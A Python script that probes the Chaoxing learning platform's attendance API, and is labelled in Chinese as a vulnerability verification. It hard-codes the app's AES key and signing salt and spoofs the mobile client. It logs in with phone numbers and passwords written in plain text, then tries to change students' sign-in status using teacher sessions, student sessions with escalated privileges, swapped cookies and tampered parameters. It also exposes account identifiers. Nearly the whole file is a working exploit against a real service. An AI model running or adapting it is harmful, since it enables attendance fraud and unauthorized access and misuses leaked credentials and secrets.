import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
TEACHER_PUID = "402644510"
STUDENT_PUID = "431407443"
TEST_AID = "5000163767353"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:800]})
    vuln = any(kw in detail for kw in ["修改成功", "true", "success"]) or "true" in evidence.lower()[:100]
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:200]}")

def call_v2_api(session, active_id, uids, status, remark="", db_strategy="PRIMARY_KEY", strategy_para="activeId", method="multipart"):
    base = "https://mobilelearn.chaoxing.com"
    url = f"{base}/pptSign/updateSignStatusByUidsV2"
    params = {
        "DB_STRATEGY": db_strategy,
        "STRATEGY_PARA": strategy_para,
        "activeId": active_id,
    }
    ajax_hdr = {
        "Referer": "https://mobilelearn.chaoxing.com/",
        "X-Requested-With": "XMLHttpRequest",
    }

    if method == "multipart":
        files = {}
        fields = {"uids": (None, uids), "status": (None, str(status)), "remark": (None, remark)}
        r = session.post(url, params=params, files=fields, headers=ajax_hdr, timeout=20)
    elif method == "urlencoded":
        data = {"uids": uids, "status": str(status), "remark": remark}
        r = session.post(url, params=params, data=data, headers={**ajax_hdr, "Content-Type": "application/x-www-form-urlencoded"}, timeout=20)
    elif method == "GET":
        params.update({"uids": uids, "status": str(status), "remark": remark})
        r = session.get(url, params=params, headers=ajax_hdr, timeout=20)
    else:
        data = {"uids": uids, "status": str(status), "remark": remark}
        r = session.post(url, params=params, data=data, headers=ajax_hdr, timeout=20)

    return r

def run():
    print("=" * 80)
    print(f"updateSignStatusByUidsV2 API漏洞验证")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    print("\n" + "=" * 80)
    print("[2] Task 1: 教师账号调用updateSignStatusByUidsV2")
    print("=" * 80)

    r = call_v2_api(s_t, TEST_AID, STUDENT_PUID, 2, method="multipart")
    d = safe_json(r)
    rec("T1-01", f"教师 multipart uids={STUDENT_PUID} status=2: HTTP {r.status_code}, {r.text[:200]}", r.text[:500])

    r = call_v2_api(s_t, TEST_AID, STUDENT_PUID, 2, method="urlencoded")
    d = safe_json(r)
    rec("T1-02", f"教师 urlencoded uids={STUDENT_PUID} status=2: HTTP {r.status_code}, {r.text[:200]}", r.text[:500])

    r = call_v2_api(s_t, TEST_AID, STUDENT_PUID, 2, method="default")
    d = safe_json(r)
    rec("T1-03", f"教师 default uids={STUDENT_PUID} status=2: HTTP {r.status_code}, {r.text[:200]}", r.text[:500])

    print("\n--- 不同status值测试 ---")
    for status_val in [0, 1, 2, 3, 4, 5, 6, 7]:
        r = call_v2_api(s_t, TEST_AID, STUDENT_PUID, status_val, method="multipart")
        rec(f"T1-status-{status_val}", f"教师 status={status_val}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n--- 不同DB_STRATEGY测试 ---")
    for db_str in ["PRIMARY_KEY", "NONE", "", "RANDOM", "SLAVE"]:
        r = call_v2_api(s_t, TEST_AID, STUDENT_PUID, 2, db_strategy=db_str, method="multipart")
        rec(f"T1-db-{db_str or 'empty'}", f"教师 DB_STRATEGY={db_str or 'empty'}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n--- 批量uids测试 ---")
    r = call_v2_api(s_t, TEST_AID, f"{STUDENT_PUID},{TEACHER_PUID}", 2, method="multipart")
    rec("T1-batch", f"教师 批量uids: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    r = call_v2_api(s_t, TEST_AID, f"{STUDENT_PUID},999999999", 2, method="multipart")
    rec("T1-batch2", f"教师 uids+不存在uid: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n--- 不带DB_STRATEGY参数测试 ---")
    base = "https://mobilelearn.chaoxing.com"
    url = f"{base}/pptSign/updateSignStatusByUidsV2"
    r = s_t.post(url, params={"activeId": TEST_AID},
                 files={"uids": (None, STUDENT_PUID), "status": (None, "2"), "remark": (None, "")},
                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest"}, timeout=20)
    rec("T1-no-db", f"教师 无DB_STRATEGY: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[3] Task 2: 学生账号越权调用updateSignStatusByUidsV2")
    print("=" * 80)

    r = call_v2_api(s_s, TEST_AID, STUDENT_PUID, 2, method="multipart")
    rec("T2-01", f"学生 multipart uids=自己 status=2: HTTP {r.status_code}, {r.text[:200]}", r.text[:500])

    r = call_v2_api(s_s, TEST_AID, STUDENT_PUID, 2, method="urlencoded")
    rec("T2-02", f"学生 urlencoded uids=自己 status=2: HTTP {r.status_code}, {r.text[:200]}", r.text[:500])

    r = call_v2_api(s_s, TEST_AID, STUDENT_PUID, 2, method="default")
    rec("T2-03", f"学生 default uids=自己 status=2: HTTP {r.status_code}, {r.text[:200]}", r.text[:500])

    r = call_v2_api(s_s, TEST_AID, TEACHER_PUID, 2, method="multipart")
    rec("T2-04", f"学生 multipart uids=教师 status=2: HTTP {r.status_code}, {r.text[:200]}", r.text[:500])

    for status_val in [0, 1, 2, 3, 4, 5, 6]:
        r = call_v2_api(s_s, TEST_AID, STUDENT_PUID, status_val, method="multipart")
        rec(f"T2-status-{status_val}", f"学生 status={status_val}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n--- 学生使用教师Cookie ---")
    s_hybrid = requests.Session()
    s_hybrid.verify = False
    s_hybrid.headers.update(s_s.headers)
    for c in s_t.cookies:
        s_hybrid.cookies.set(c.name, c.value, domain=c.domain, path=c.path)

    r = call_v2_api(s_hybrid, TEST_AID, STUDENT_PUID, 2, method="multipart")
    rec("T2-hybrid", f"教师Cookie+学生UA: HTTP {r.status_code}, {r.text[:200]}", r.text[:500])

    print("\n" + "=" * 80)
    print("[4] Task 3: 参数篡改测试")
    print("=" * 80)

    print("\n--- 不同activeId测试 ---")
    r = s_t.get(f"https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t}, timeout=20)
    d = safe_json(r)
    all_aids = []
    if isinstance(d, dict) and "activeList" in d:
        for item in d["activeList"]:
            all_aids.append(str(item.get("id", "")))

    for aid in all_aids[:5]:
        r = call_v2_api(s_t, aid, STUDENT_PUID, 2, method="multipart")
        rec(f"T3-aid-{aid[:8]}", f"教师 aid={aid}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

        r = call_v2_api(s_s, aid, STUDENT_PUID, 2, method="multipart")
        rec(f"T3-aid-{aid[:8]}-s", f"学生 aid={aid}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n--- 添加额外参数测试 ---")
    base = "https://mobilelearn.chaoxing.com"
    url = f"{base}/pptSign/updateSignStatusByUidsV2"
    extra_params_tests = [
        {"uids": STUDENT_PUID, "status": "2", "remark": "", "latitude": "39.9042", "longitude": "116.4074"},
        {"uids": STUDENT_PUID, "status": "2", "remark": "", "enc": "test"},
        {"uids": STUDENT_PUID, "status": "2", "remark": "", "signCode": "1234"},
        {"uids": STUDENT_PUID, "status": "2", "remark": "", "classId": CLASS_ID, "courseId": COURSE_ID},
    ]

    for i, data in enumerate(extra_params_tests):
        r = s_t.post(url, params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": TEST_AID},
                     data=data,
                     headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                              "Content-Type": "application/x-www-form-urlencoded"}, timeout=20)
        extra = [k for k in data if k not in ("uids", "status", "remark")]
        rec(f"T3-extra-{i}", f"教师 +{extra}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n--- GET方法测试 ---")
    r = call_v2_api(s_t, TEST_AID, STUDENT_PUID, 2, method="GET")
    rec("T3-GET", f"教师 GET: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    r = call_v2_api(s_s, TEST_AID, STUDENT_PUID, 2, method="GET")
    rec("T3-GET-s", f"学生 GET: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[5] Task 4: 签到状态修改持久化验证")
    print("=" * 80)

    for aid in all_aids[:3]:
        r = s_s.get(f"https://mobilelearn.chaoxing.com/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
                    timeout=20)
        d = safe_json(r)
        if d.get("result") == 1 and isinstance(d.get("data"), dict):
            current_status = d["data"].get("status", "?")
            rec(f"T5-before-{aid[:8]}", f"签到状态(修改前): aid={aid}, status={current_status}")

    print("\n" + "=" * 80)
    print("[6] 保存结果")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "v2_uids_api_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    success = sum(1 for r in results if "修改成功" in r.get("detail", "") or "修改成功" in r.get("evidence", "") or '"result":true' in r.get("evidence", ""))
    fail = sum(1 for r in results if "修改失败" in r.get("detail", "") or "修改失败" in r.get("evidence", ""))
    perm = sum(1 for r in results if "无权限" in r.get("detail", "") or "无权限" in r.get("evidence", ""))
    print(f"  修改成功: {success}, 修改失败: {fail}, 无权限: {perm}")

if __name__ == "__main__":
    run()
